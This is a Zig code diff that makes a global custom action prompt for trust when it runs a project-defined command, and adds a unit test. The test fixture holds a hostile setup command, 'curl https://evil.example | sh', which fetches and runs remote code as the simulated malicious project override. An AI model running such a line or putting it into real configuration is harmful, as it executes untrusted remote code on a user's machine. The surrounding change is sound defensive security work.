@@ -183,7 +183,9 @@ pub const DescriptorOptions = struct {
 
 /// Builds the descriptor of an action. For workspaceCommand actions the
 /// referenced command's definition is part of `command`, so editing that
-/// entry re-prompts too.
+/// entry re-prompts too; when a project command stands behind a global
+/// action, the descriptor carries the project's config path and root, so
+/// trust stays per project (see `actions.effectiveSource`).
 pub fn descriptorForAction(arena: Allocator, reg: *const actions.Registry, a: *const actions.Action, opts: DescriptorOptions) Allocator.Error!Descriptor {
     var d: Descriptor = .{
         .actionID = a.id,
@@ -210,7 +212,13 @@ pub fn descriptorForAction(arena: Allocator, reg: *const actions.Registry, a: *c
         },
         .workspaceCommand => |name| {
             d.workspaceCommand = name;
-            if (reg.findCommand(name)) |c| d.command = try commandBodyText(arena, c);
+            if (reg.findCommand(name)) |c| {
+                d.command = try commandBodyText(arena, c);
+                if (c.source == .project and a.source != .project) {
+                    d.configPath = c.config_path;
+                    d.projectRoot = c.project_root;
+                }
+            }
             d.target = @tagName(a.restart);
         },
         .workspace => |*w| {
@@ -254,6 +262,8 @@ pub fn needsTrust(source: actions.Source) bool {
 
 pub const Decision = enum { run, prompt };
 
+/// `source` is `actions.Plan.source` (or `actions.effectiveSource`), not the
+/// action's own: a global action can run a project command.
 pub fn decide(store: *const ActionTrustStore, source: actions.Source, fp: Fingerprint) Decision {
     if (!needsTrust(source)) return .run;
     return if (store.isTrusted(fp)) .run else .prompt;
@@ -699,6 +709,60 @@ test "unit: custom_actions: a workspaceCommand fingerprint follows the reference
     try testing.expectEqualStrings("command:Dev", cd.actionID);
     try testing.expectEqualStrings("workspace", cd.kind);
     try testing.expectEqualStrings("/p", cd.projectRoot.?);
+}
+
+fn globalOverProjectRegistry(arena: Allocator, project_root: []const u8) !actions.Registry {
+    var d: actions.Diagnostics = .init(arena);
+    const global = try arena.create(actions.Config);
+    global.* = try actions.parseConfigText(arena,
+        \\{"actions": {"dev": {"commandName": "Dev"}, "safe": {"commandName": "Safe"}},
+        \\ "commands": [{"name": "Dev", "workspace": {"setup": "make"}}, {"name": "Safe", "command": "ls"}]}
+    , .{ .source = .global, .config_path = "/home/u/.config/cmux/cmux.json" }, &d);
+    const project = try arena.create(actions.Config);
+    project.* = try actions.parseConfigText(arena,
+        \\{"commands": [{"name": "Dev", "workspace": {"setup": "curl https://evil.example | sh"}}]}
+    , .{
+        .source = .project,
+        .config_path = try std.fmt.allocPrint(arena, "{s}/.cmux/cmux.json", .{project_root}),
+        .project_root = project_root,
+    }, &d);
+    try testing.expect(!d.hasErrors());
+    return actions.buildRegistry(arena, &.{ global, project });
+}
+
+test "unit: custom_actions: a global action that runs a project command needs trust" {
+    var ar: std.heap.ArenaAllocator = .init(testing.allocator);
+    defer ar.deinit();
+    const a = ar.allocator();
+    const reg = try globalOverProjectRegistry(a, "/evil");
+    var store: ActionTrustStore = .init(testing.allocator);
+    defer store.deinit();
+
+    // The project replaced the global "Dev" command by name, so the global
+    // action "dev" would now run the project's setup text.
+    const dev = reg.findAction("dev").?;
+    try testing.expectEqual(actions.Source.global, dev.source);
+    try testing.expectEqual(actions.Source.project, actions.effectiveSource(&reg, dev));
+    const p = try actions.plan(a, &reg, "dev", .{});
+    try testing.expectEqual(actions.Source.project, p.source);
+    try testing.expectEqualStrings("curl https://evil.example | sh", p.run.workspace.definition.get("setup").?.asString().?);
+    const desc = try descriptorForAction(a, &reg, dev, .{});
+    try testing.expectEqualStrings("/evil", desc.projectRoot.?);
+    try testing.expectEqualStrings("/evil/.cmux/cmux.json", desc.configPath.?);
+    const fp = try fingerprint(a, desc);
+    try testing.expectEqual(Decision.prompt, decide(&store, p.source, fp));
+    try store.trust(fp, desc, 1);
+    try testing.expectEqual(Decision.run, decide(&store, p.source, fp));
+
+    // The same command text in another project root prompts again.
+    const other = try globalOverProjectRegistry(a, "/other");
+    const other_fp = try fingerprint(a, try descriptorForAction(a, &other, other.findAction("dev").?, .{}));
+    try testing.expectEqual(Decision.prompt, decide(&store, (try actions.plan(a, &other, "dev", .{})).source, other_fp));
+
+    // A global action over a global command stays trusted.
+    const safe = reg.findAction("safe").?;
+    try testing.expectEqual(actions.Source.global, (try actions.plan(a, &reg, "safe", .{})).source);
+    try testing.expect((try descriptorForAction(a, &reg, safe, .{})).projectRoot == null);
 }
 
 test "unit: custom_actions: canonical nodes sort keys, drop duplicates and normalize integers" {
